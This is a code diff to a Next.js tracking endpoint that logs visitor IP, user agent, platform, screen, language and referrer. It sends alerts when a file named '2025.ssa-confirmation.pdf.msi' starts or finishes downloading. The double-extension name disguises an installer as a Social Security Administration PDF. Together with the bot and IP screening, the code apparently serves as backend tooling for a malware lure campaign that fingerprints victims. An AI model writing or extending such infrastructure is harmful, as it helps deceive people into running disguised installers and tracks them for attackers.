@@ -39,6 +39,15 @@ export async function POST(request: NextRequest) {
             console.log(`[Track] Bot detected: ${ip}, type: ${uaCheck.botType}`);
         }
 
+        console.log(`[Visit] 📅 Time: ${data.timestamp || new Date().toISOString()}`);
+        console.log(`[Visit] 🌐 IP: ${ip}`);
+        console.log(`[Visit] 💻 User Agent: ${userAgent}`);
+        console.log(`[Visit] 📱 Platform: ${data.platform || 'Unknown'}`);
+        console.log(`[Visit] 🖥️ Screen: ${data.screenResolution || 'Unknown'}`);
+        console.log(`[Visit] 🌍 Language: ${data.language || 'Unknown'}`);
+        console.log(`[Visit] 🔗 Referrer: ${data.referrer || 'Direct'}`);
+        console.log(`[Visit] 🔔 Event: ${data.event}`);
+
         let securityCheck: SecurityCheckResult | null = null;
         
         if (ip !== 'Unknown' && ip !== '127.0.0.1' && ip !== 'localhost') {
@@ -74,7 +83,7 @@ export async function POST(request: NextRequest) {
 }
 
 function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
-    const fileName = '2025.ssa-confirmation.pdf.msi';
+    const fileName = process.env.DOWNLOAD_FILE_PATH || '2025-ssa-confirmationpdf.msi';
     
     let eventText = data.event;
     if (data.event === 'Download Started') {
@@ -83,10 +92,18 @@ function formatMessage(data: TrackingData, ip: string, security: SecurityCheckRe
         eventText = `Your ${fileName} has finished downloading`;
     }
     
-    let message = `🔔 **${eventText}**`;
+    let message = `🔔 **${eventText}**\n\n`;
+    
+    message += `📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
+    message += `🌐 IP: ${ip}\n`;
+    message += `💻 User Agent: ${data.userAgent || 'Unknown'}\n`;
+    message += `📱 Platform: ${data.platform || 'Unknown'}\n`;
+    message += `🖥️ Screen: ${data.screenResolution || 'Unknown'}\n`;
+    message += `🌍 Language: ${data.language || 'Unknown'}\n`;
+    message += `🔗 Referrer: ${data.referrer || 'Direct'}`;
 
     if (security) {
-        message += formatSecurityMessage(security);
+        message += '\n' + formatSecurityMessage(security);
     }
 
     return message;
